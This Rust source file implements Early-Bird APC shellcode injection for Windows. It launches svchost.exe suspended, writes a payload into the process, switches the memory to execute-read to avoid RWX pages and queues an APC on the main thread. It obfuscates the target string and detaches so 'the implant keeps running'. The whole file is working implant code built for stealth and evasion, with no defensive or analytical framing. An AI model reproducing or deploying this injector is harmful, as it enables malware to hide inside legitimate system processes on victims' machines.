use anyhow::{anyhow, Result};
use crate::injection::Injector;

/// Early-Bird APC injection:
/// 1. Create a sacrificial process suspended (svchost.exe).
/// 2. Allocate RWX memory in it and write shellcode.
/// 3. Queue a user-mode APC on the main thread pointing at shellcode.
/// 4. Resume the thread — Windows drains the APC queue before running user code.
pub struct EarlyBirdInjector;

#[cfg(windows)]
impl Injector for EarlyBirdInjector {
    fn inject(&self, _pid: u32, payload: &[u8]) -> Result<()> {
        use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW};
        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use winapi::um::winbase::CREATE_SUSPENDED;
        use winapi::um::handleapi::CloseHandle;

        let target_enc = string_crypt::enc_str!("svchost.exe");
        let target_str = String::from_utf8_lossy(&target_enc);
        let target_name = target_str.trim_end_matches('\0');

        // Build wide path: %SystemRoot%\System32\svchost.exe -k netsvcs
        let sys_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        let cmd_str = format!("{}\\System32\\{} -k netsvcs -p", sys_root, target_name);
        let mut cmd_wide: Vec<u16> = cmd_str.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            let mut si: STARTUPINFOW = std::mem::zeroed();
            si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let ok = CreateProcessW(
                std::ptr::null_mut(),
                cmd_wide.as_mut_ptr(),
                std::ptr::null_mut(), std::ptr::null_mut(),
                0, CREATE_SUSPENDED, std::ptr::null_mut(),
                std::ptr::null_mut(), &mut si, &mut pi,
            );
            if ok == 0 {
                return Err(anyhow!("EarlyBird: CreateProcessW failed"));
            }

            // Allocate RW, write, then switch to RX to avoid RWX pages
            let remote_mem = VirtualAllocEx(pi.hProcess, std::ptr::null_mut(), payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if remote_mem.is_null() {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                return Err(anyhow!("EarlyBird: VirtualAllocEx failed"));
            }

            let mut written = 0usize;
            if WriteProcessMemory(pi.hProcess, remote_mem, payload.as_ptr() as _, payload.len(), &mut written) == 0 {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                return Err(anyhow!("EarlyBird: WriteProcessMemory failed"));
            }

            // Switch to execute-read before queuing the APC
            let mut old_prot = 0u32;
            VirtualProtectEx(pi.hProcess, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);

            // QueueUserAPC: the callback is called when the thread enters an
            // alertable wait state.  Since the thread hasn't started yet, it
            // processes the APC immediately on the first alertable wait.
            use winapi::um::processthreadsapi::QueueUserAPC;
            type APCProc = unsafe extern "system" fn(usize);
            let apc_fn: APCProc = std::mem::transmute(remote_mem);
            if QueueUserAPC(Some(apc_fn), pi.hThread, 0) == 0 {
                winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                return Err(anyhow!("EarlyBird: QueueUserAPC failed"));
            }

            ResumeThread(pi.hThread);
            // Detach — we don't wait so the implant keeps running.
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for EarlyBirdInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("Early-Bird APC injection only supported on Windows"))
    }
}
